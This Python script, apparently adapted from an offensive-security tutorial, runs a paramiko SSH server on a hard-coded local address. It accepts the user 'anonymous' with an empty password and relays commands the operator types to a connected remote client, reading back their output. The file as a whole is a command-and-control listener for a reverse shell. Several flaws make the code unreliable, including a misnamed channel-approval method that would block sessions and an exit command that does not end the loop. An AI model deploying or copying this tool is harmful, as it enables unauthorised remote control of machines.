#!/usr/bin/python

import socket
import paramiko
import threading
import sys


#使用paramiko生成密钥
host_key = paramiko.RSAKey(filename='C:/Users\Anonymous/.ssh/id_rsa')


class Server(paramiko.ServerInterface):
    def __init__(self):
        self.evemt = threading.Event()
    def check_channel_env_request(self,kind,chanid):
        if kind =='session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self,username,password):
        if (username == 'anonymous') and (password == ''):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

#server = sys.argv[1]
#ssh_port = int(sys.argv[2])
server = '192.168.0.102'
ssh_port = 22
try:
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    sock.bind((server.encode('utf-8'),ssh_port))
    sock.listen(100)
    print('[+] Listening for connection...')
    client,addr = sock.accept()
except Exception as e:
    print('[-] Listen failed:',e)
    sys.exit(1)
print('[+] Got a connection!')

try:
    bhSession = paramiko.Transport(client)
    bhSession.banner_timeout = 30
    bhSession.add_server_key(host_key)
    server = Server()
    try:
        bhSession.start_server(server=server)
    except paramiko.SSHException as sshe:
        print('[-] SSH negotiation failed.')
    chan = bhSession.accept(20)
    print('[+] Authenticated!')
    print((chan.recv(1024)).decode('utf-8'))
    chan.send('Welcome to bh_ssh'.encode('utf-8'))

    while True:
        try:
            command = input("Enter command: ").strip('\n')
            if command != 'exit':
                chan.send(command.encode('utf-8'))
                print((chan.recv(1024)).decode('utf-8') + '\n')
            else:
                chan.send('exit'.encode("utf-8"))
                print("exiting!!")
        except KeyboardInterrupt:
            bhSession.close()

except Exception as e:
    print("[-] Caught exception:",e)
    try:
        bhSession.close()
    except:
        pass
    sys.exit(1)

